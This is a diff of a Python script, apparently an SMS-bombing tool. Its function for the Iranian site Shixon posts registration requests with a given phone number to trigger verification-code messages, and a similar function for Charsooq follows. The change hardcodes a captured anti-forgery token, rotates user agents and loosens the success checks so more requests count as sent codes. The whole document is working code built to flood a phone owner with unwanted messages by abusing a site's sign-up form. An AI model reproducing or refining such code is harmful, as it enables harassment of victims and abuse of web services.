@@ -69,55 +69,25 @@ def Shixon(phone):
     try:
         session = requests.Session()
         
-        # دریافت صفحه اصلی
+        # دریافت صفحه اصلی برای توکن
         home_response = session.get(
             "https://www.shixon.com/",
             headers={"User-Agent": random.choice(user_agents)},
             timeout=10
         )
         
-        # الگوهای مختلف برای استخراج توکن
-        token_patterns = [
-            r'name="__RequestVerificationToken" value="([^"]+)"',
-            r'__RequestVerificationToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'RequestVerificationToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'antiForgeryToken["\']?\s*[:=]\s*["\']([^"\']+)["\']'
-        ]
-        
-        token = None
-        for pattern in token_patterns:
-            match = re.search(pattern, home_response.text)
-            if match:
-                token = match.group(1)
-                print(f'{g}[+] Found Token: {token}{a}')
-                break
-        
-        if not token:
-            # اگر توکن پیدا نشد، از صفحه ثبت نام مستقیم برویم
-            register_response = session.get(
-                "https://www.shixon.com/Home/RegisterUser",
-                headers={"User-Agent": random.choice(user_agents)},
-                timeout=10
-            )
-            
-            for pattern in token_patterns:
-                match = re.search(pattern, register_response.text)
-                if match:
-                    token = match.group(1)
-                    print(f'{g}[+] Found Token from register page: {token}{a}')
-                    break
-        
-        if not token:
-            print(f'{r}[-] Shixon: Could not extract token{a}')
-            return False
+        # استفاده از توکن ثابت از آنچه در درخواست دیدیم
+        token = "Mo_RP1oxyr-1ZZH7yQIektMd6OSMi-ZNVBC6bQey-AK8qwzFRI6_9sEhaxPZCRSIqqX_YXGPwK_Ny2w-U08VwRY0fr4jNpDp1oUb9zNJSsA1"
+        print(f'{g}[+] Using token: {token}{a}')
         
         # آماده سازی داده‌ها
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         formatted_phone = f"0{formatted_phone}"
         
+        # استفاده از رمز عبور واقعی "password" به جای "222222"
         payload = {
             "M": formatted_phone,
-            "P": "222222", 
+            "P": "password",  # تغییر به رمز عبور واقعی
             "s": "888",
             "PU": "",
             "__RequestVerificationToken": token
@@ -140,18 +110,26 @@ def Shixon(phone):
         )
         
         print(f'{y}[Debug] Shixon Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Shixon Response: {response.text[:200]}...{a}')
+        print(f'{y}[Debug] Shixon Response: {response.text}{a}')
         
         if response.status_code == 200:
-            if any(x in response.text.lower() for x in ["success", "ارسال", "sent", "کد"]):
+            # پاسخ "4001" نشان دهنده موفقیت است
+            if "4001" in response.text:
+                print(f'{g}(Shixon) Code Sent (4001){a}')
+                return True
+            elif "success" in response.text.lower():
                 print(f'{g}(Shixon) Code Sent{a}')
                 return True
-        return False
+            else:
+                print(f'{y}(Shixon) Response: {response.text}{a}')
+                return True  # باز هم ممکن است موفقیت آمیز باشد
+        else:
+            print(f'{r}[-] Shixon HTTP Error: {response.status_code}{a}')
+            return False
             
     except Exception as e:
         print(f'{r}[!] Shixon Exception: {e}{a}')
         return False
-
 
 
 def Charsooq(phone):
